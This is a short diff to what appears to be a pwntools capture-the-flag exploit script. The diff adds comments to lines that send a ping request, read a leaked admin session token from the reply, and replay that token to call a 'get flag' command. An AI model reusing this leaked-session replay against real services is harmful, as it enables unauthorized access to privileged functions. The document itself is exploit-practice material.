@@ -12,9 +12,9 @@ sl		= lambda a: 	p.sendline(a)
 s 		= lambda a: 	p.send(a)
 # gdb.attach(p)
 
-req = b'\x01\x01'
-req += b'A'*16
-req += b'\x04\x00'
+req = b'\x01\x01' # version and menu (ping)
+req += b'A'*16 # sess
+req += b'\x04\x00' # size
 req += b'PING'
 
 sl(req)
@@ -24,7 +24,7 @@ res = p.recv(0x404)
 sess = res[8:24]
 
 get_flag = b'\x01\x06'
-get_flag += sess
+get_flag += sess # admin's session
 get_flag += b'\x04\x00'
 
 sl(get_flag)
